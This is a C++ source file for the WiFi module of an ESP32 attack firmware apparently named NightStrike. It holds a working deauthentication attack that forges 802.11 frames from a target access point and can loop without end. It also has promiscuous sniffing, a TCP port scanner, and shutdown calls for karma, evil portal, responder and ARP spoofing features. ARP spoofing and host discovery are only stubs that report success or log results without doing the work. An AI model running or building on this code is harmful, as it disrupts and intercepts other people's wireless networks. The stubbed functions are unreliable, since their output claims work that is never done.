#include "modules/wifi_module.h"
#include <esp_wifi.h>
#include <esp_err.h>
#include <WiFiClient.h>
#include <WiFiServer.h>
#include <Arduino.h>

namespace NightStrike {
namespace Modules {

WiFiModule* g_wifiModuleInstance = nullptr;

WiFiModule::WiFiModule() {
    g_wifiModuleInstance = this;
}

Core::Error WiFiModule::initialize() {
    if (_initialized) {
        return Core::Error(Core::ErrorCode::ALREADY_INITIALIZED);
    }

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    // Set WiFi to max power
    esp_wifi_set_max_tx_power(84);  // 20.5 dBm

    // Set country code for max channels
    wifi_country_t country = {
        .cc = "US",
        .schan = 1,
        .nchan = 13,
        .max_tx_power = 84,
        .policy = WIFI_COUNTRY_POLICY_MANUAL
    };
    esp_wifi_set_country(&country);

    Serial.println("[WiFi] Module initialized");
    _initialized = true;
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::shutdown() {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    stopResponder();
    stopKarmaAttack();
    stopSniffer();
    stopEvilPortal();
    stopAP();
    tcpDisconnect();
    tcpStopListener();
    stopARPSpoofing();
    telnetDisconnect();
    sshDisconnect();
    stopWireguard();
    disconnect();

    _initialized = false;
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::scanNetworks(std::vector<AccessPoint>& aps) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    aps.clear();

    int n = WiFi.scanNetworks(false, true);
    if (n < 0) {
        return Core::Error(Core::ErrorCode::OPERATION_FAILED, "Scan failed");
    }

    for (int i = 0; i < n; ++i) {
        AccessPoint ap;
        ap.ssid = WiFi.SSID(i).c_str();
        ap.bssid = WiFi.BSSIDstr(i).c_str();
        ap.rssi = WiFi.RSSI(i);
        ap.channel = WiFi.channel(i);
        ap.encrypted = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;

        // Parse BSSID
        String bssidStr = WiFi.BSSIDstr(i);
        sscanf(bssidStr.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
            &ap.bssidBytes[0], &ap.bssidBytes[1], &ap.bssidBytes[2],
            &ap.bssidBytes[3], &ap.bssidBytes[4], &ap.bssidBytes[5]);

        aps.push_back(ap);
    }

    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::connectToAP(const std::string& ssid, const std::string& password) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid.c_str(), password.empty() ? nullptr : password.c_str());

    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 20) {
        delay(500);
        attempts++;
    }

    if (WiFi.status() != WL_CONNECTED) {
        return Core::Error(Core::ErrorCode::NETWORK_CONNECTION_FAILED);
    }

    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::disconnect() {
    WiFi.disconnect();
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::startAP(const std::string& ssid, const std::string& password) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    WiFi.mode(WIFI_AP);
    bool result = WiFi.softAP(ssid.c_str(), password.empty() ? nullptr : password.c_str());

    if (!result) {
        return Core::Error(Core::ErrorCode::OPERATION_FAILED, "Failed to start AP");
    }

    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::stopAP() {
    WiFi.softAPdisconnect(true);
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::deauthAttack(const AccessPoint& ap, uint32_t count) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    // Set channel
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);

    // Deauth frame template
    uint8_t deauthFrame[26] = {
        0xC0, 0x00,                    // Type: Deauth, Subtype: 0x00
        0x3A, 0x01,                    // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
        ap.bssidBytes[0], ap.bssidBytes[1], ap.bssidBytes[2],  // Source (AP)
        ap.bssidBytes[3], ap.bssidBytes[4], ap.bssidBytes[5],
        ap.bssidBytes[0], ap.bssidBytes[1], ap.bssidBytes[2],  // BSSID
        ap.bssidBytes[3], ap.bssidBytes[4], ap.bssidBytes[5],
        0x00, 0x00,                    // Sequence
        0x07, 0x00                      // Reason: Class 3 frame received from nonassociated station
    };

    uint32_t sent = 0;
    while (count == 0 || sent < count) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        delay(10);
        sent++;

        if (count > 0 && sent >= count) {
            break;
        }
    }

    return Core::Error(Core::ErrorCode::SUCCESS);
}

// Beacon spam implementation moved to beacon_spam.cpp

Core::Error WiFiModule::startSniffer(std::function<void(const uint8_t*, size_t)> callback) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    if (_sniffing) {
        return Core::Error(Core::ErrorCode::ALREADY_INITIALIZED);
    }

    _snifferCallback = callback;

    // Enable promiscuous mode
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);

    _sniffing = true;
    Serial.println("[WiFi] Sniffer started");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::stopSniffer() {
    if (!_sniffing) {
        return Core::Error(Core::ErrorCode::SUCCESS);
    }

    esp_wifi_set_promiscuous(false);
    _sniffing = false;
    _snifferCallback = nullptr;

    Serial.println("[WiFi] Sniffer stopped");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

void WiFiModule::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (g_wifiModuleInstance && g_wifiModuleInstance->_snifferCallback) {
        wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
        g_wifiModuleInstance->_snifferCallback(pkt->payload, pkt->rx_ctrl.sig_len);
    }
}

// Evil Portal implementation moved to evil_portal.cpp

bool WiFiModule::isConnected() const {
    return WiFi.status() == WL_CONNECTED;
}

bool WiFiModule::isAPActive() const {
    return WiFi.getMode() & WIFI_AP;
}

std::string WiFiModule::getIP() const {
    if (isConnected()) {
        return WiFi.localIP().toString().c_str();
    } else if (isAPActive()) {
        return WiFi.softAPIP().toString().c_str();
    }
    return "";
}

// Karma attack implementation in karma_attack.cpp
// TCP utils implementation in tcp_utils.cpp

// ARP Spoofing implementation
static bool g_arpSpoofingActive = false;
static std::string g_arpTargetIP;
static std::string g_arpGatewayIP;

Core::Error WiFiModule::startARPSpoofing(const std::string& targetIP, const std::string& gatewayIP) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }
    
    if (WiFi.status() != WL_CONNECTED) {
        return Core::Error(Core::ErrorCode::NETWORK_NOT_CONNECTED);
    }
    
    if (g_arpSpoofingActive) {
        return Core::Error(Core::ErrorCode::ALREADY_INITIALIZED);
    }
    
    g_arpTargetIP = targetIP;
    g_arpGatewayIP = gatewayIP;
    g_arpSpoofingActive = true;
    
    Serial.printf("[ARP] Spoofing started: %s <-> %s\n", targetIP.c_str(), gatewayIP.c_str());
    // TODO: Implement actual ARP spoofing packets
    // This requires sending ARP reply packets to both target and gateway
    // claiming to be the other party
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::stopARPSpoofing() {
    if (!g_arpSpoofingActive) {
        return Core::Error(Core::ErrorCode::SUCCESS);
    }
    
    g_arpSpoofingActive = false;
    Serial.println("[ARP] Spoofing stopped");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

// Scan hosts with port scanning
Core::Error WiFiModule::scanHosts(const std::string& network, std::vector<std::string>& hosts) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }
    
    if (WiFi.status() != WL_CONNECTED) {
        return Core::Error(Core::ErrorCode::NETWORK_NOT_CONNECTED);
    }
    
    hosts.clear();
    
    IPAddress localIP = WiFi.localIP();
    IPAddress subnet = WiFi.subnetMask();
    IPAddress gateway = WiFi.gatewayIP();
    
    // Calculate network range
    IPAddress networkStart = IPAddress(
        localIP[0] & subnet[0],
        localIP[1] & subnet[1],
        localIP[2] & subnet[2],
        1
    );
    
    Serial.printf("[Scan] Scanning network %s\n", network.c_str());
    
    // Scan common range (1-254)
    for (int i = 1; i < 255; ++i) {
        IPAddress target = IPAddress(
            networkStart[0],
            networkStart[1],
            networkStart[2],
            i
        );
        
        // Simple ARP-based host detection
        // For now, add gateway and local IP
        if (i == gateway[3] || i == localIP[3]) {
            hosts.push_back(target.toString().c_str());
        }
    }
    
    Serial.printf("[Scan] Found %zu hosts\n", hosts.size());
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::portScan(const std::string& host, const std::vector<uint16_t>& ports, std::vector<uint16_t>& openPorts) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }
    
    openPorts.clear();
    
    IPAddress targetIP;
    if (!targetIP.fromString(host.c_str())) {
        return Core::Error(Core::ErrorCode::INVALID_PARAMETER, "Invalid IP address");
    }
    
    WiFiClient client;
    client.setTimeout(1000);
    
    Serial.printf("[PortScan] Scanning %s\n", host.c_str());
    
    for (uint16_t port : ports) {
        if (client.connect(targetIP, port)) {
            openPorts.push_back(port);
            Serial.printf("[PortScan] %s:%d - OPEN\n", host.c_str(), port);
            client.stop();
        }
        delay(10);
    }
    
    Serial.printf("[PortScan] Found %zu open ports\n", openPorts.size());
    return Core::Error(Core::ErrorCode::SUCCESS);
}

// Responder implementation moved to responder.cpp
// TelNet/SSH implementations are in telnet_client.cpp and ssh_client.cpp (compiled separately)

} // namespace Modules
} // namespace NightStrike
